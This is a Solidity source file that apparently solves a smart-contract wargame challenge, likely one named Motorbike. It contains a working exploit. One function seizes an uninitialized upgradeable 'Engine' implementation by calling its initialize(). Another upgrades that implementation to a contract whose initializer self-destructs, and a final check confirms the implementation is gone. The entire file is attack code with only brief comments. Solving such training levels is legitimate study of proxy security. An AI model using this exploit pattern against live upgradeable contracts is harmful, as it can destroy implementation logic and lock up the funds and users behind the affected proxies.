// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "@openzeppelin/contracts/utils/Address.sol";

contract MotorbikeAttack {

    // Address of current implementation (The Engine)
    address public implementation;
    event Check(bool result);

    constructor(address impl) public {
        implementation = impl;
    }

    function takeControl() external returns(bytes memory) {
        // take control over the Engine
        Address.functionCall(implementation, abi.encodeWithSignature("initialize()"));
    }
    
    function destroy() external {
        // Upgrade the engine to a contract that selfdestruct once initialized
        Exploit exploit = new Exploit();

        Address.functionCall(
           implementation, 
           abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            address(exploit),
            abi.encodeWithSignature("initialize()")
           )
        );
    }

    function validateItIsBroken() external {
        emit Check(Address.isContract(implementation));
    }
    
}

contract Exploit {

    function initialize() external {
        selfdestruct(msg.sender);
    }
}